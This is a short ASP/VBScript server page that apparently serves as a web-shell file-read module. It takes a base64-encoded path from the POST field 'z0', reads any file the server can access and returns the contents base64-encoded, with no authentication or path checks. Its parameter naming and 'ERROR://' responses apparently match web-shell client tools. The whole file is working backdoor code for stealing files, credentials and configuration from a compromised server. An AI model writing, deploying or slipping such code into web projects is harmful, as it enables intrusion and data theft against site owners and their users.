<%

On Error Resume Next

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8"
        End Select
    End If
    GetCurrentCharset = charset
End Function

Function DecodeBase64(base64Str)
    If Trim(base64Str) = "" Then
        DecodeBase64 = ""
        Exit Function
    End If

    Dim xml, node, stream
    ' 建議改用 6.0 版本
    Set xml = Server.CreateObject("MSXML2.DOMDocument.6.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = base64Str

    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = GetCurrentCharset()

    DecodeBase64 = stream.ReadText

    stream.Close
    Set stream = Nothing
    Set node = Nothing
    Set xml = Nothing
End Function

Function FileToBase64(filePath)
    Dim stream, dom, node
    
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.LoadFromFile filePath
    
    Set dom = Server.CreateObject("MSXML2.DOMDocument.6.0")
    Set node = dom.createElement("tmp")
    node.dataType = "bin.base64"
    node.nodeTypedValue = stream.Read()
    
    FileToBase64 = Replace(node.text, vbLf, "")
    FileToBase64 = Replace(FileToBase64, vbCr, "")
    
    stream.Close
    Set stream = Nothing
    Set node = Nothing
    Set dom = Nothing
End Function

Function Main()
    Dim raw_z0
    raw_z0 = Request.Form("z0")
    If Trim(raw_z0) = "" Then
        Main = "ERROR://No parameter received."
        Exit Function
    End If

    Dim file_path
    file_path = DecodeBase64(raw_z0)

    Dim fso
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    
    If Not fso.FileExists(file_path) Then
        Main = "ERROR://Cannot find file: " & file_path
        Set fso = Nothing
        Exit Function
    End If
    Set fso = Nothing

    Dim result
    result = FileToBase64(file_path)
    
    If Err.Number <> 0 Then
        Main = "ERROR://" & Err.Description
    Else
        Main = result
    End If
End Function

Response.Write Main()

%>